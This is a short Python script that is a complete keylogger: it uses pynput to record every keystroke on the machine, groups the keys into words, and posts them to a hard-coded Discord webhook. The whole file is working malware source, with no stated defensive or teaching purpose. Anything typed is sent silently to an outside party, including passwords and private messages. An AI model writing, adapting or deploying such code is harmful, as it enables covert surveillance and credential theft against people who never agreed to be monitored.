import pynput
import pynput.keyboard
from pynput.keyboard import Key, Listener
import requests
import time

current_word = []

def on_press(key):
    global current_word
    try:
        key_pressed = str(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.enter:
            key_pressed = "\n"
            send_to_discord("[key.ENTER]")
        elif key == pynput.keyboard.Key.space:
            key_pressed = " "
        elif key == pynput.keyboard.Key.backspace:
            key_pressed = ""
            send_to_discord("[key.backspace]")
        else:
            key_pressed = f"[{key}]"

    if key_pressed != "":
        current_word.append(key_pressed)

    if key_pressed == "" or key_pressed == "\n":
        if len(current_word) > 1:
            send_to_discord(''.join(current_word))
        current_word = []

def send_to_discord(key):
    url = "https://discord.com/api/webhooks/1309903363550478356/7TzOHTOlo6VOoinI0TumhhqziTIU5yYISUqaqU8EXg2wPTGUhZackDCTcciTvdOZ_a5V"
    data = {"content": key}
    requests.post(url, json=data)

def main():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()